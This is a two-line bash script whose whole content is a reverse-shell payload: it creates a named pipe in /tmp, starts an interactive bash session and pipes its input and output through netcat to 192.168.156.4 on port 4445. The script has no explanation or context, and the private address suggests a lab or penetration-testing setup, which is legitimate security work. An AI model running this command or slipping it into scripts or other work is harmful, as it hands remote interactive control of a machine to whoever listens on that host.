#!/bin/bash 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.156.4 4445 >/tmp/f
